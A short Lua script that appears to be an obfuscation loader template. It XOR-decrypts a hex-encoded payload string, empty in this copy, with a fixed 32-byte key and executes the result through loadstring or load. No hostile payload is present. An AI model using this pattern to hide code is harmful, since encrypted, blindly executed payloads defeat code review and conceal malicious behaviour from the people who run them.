local k={255,10,137,107,43,217,177,156,62,237,187,75,96,148,228,114,221,101,70,182,205,41,205,179,77,96,230,36,77,119,249,117}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
c(table.concat(t))()
